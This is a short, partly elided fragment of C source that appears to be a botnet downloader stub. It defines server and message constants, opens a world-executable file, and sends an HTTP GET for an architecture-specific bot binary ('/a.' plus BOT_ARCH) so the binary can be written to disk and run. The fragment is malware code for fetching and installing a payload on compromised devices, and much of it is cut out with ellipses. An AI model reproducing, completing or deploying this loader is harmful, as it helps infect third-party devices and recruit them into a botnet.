...
#define HTTP_SERVER utils_inet_addr(0,0,0,0)

#define EXEC_MSG            "dvrmp\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "dvr8p\n"
...
inline void run(void)
{
    ...
    ffd = open("hgnm33ws4", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /a." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
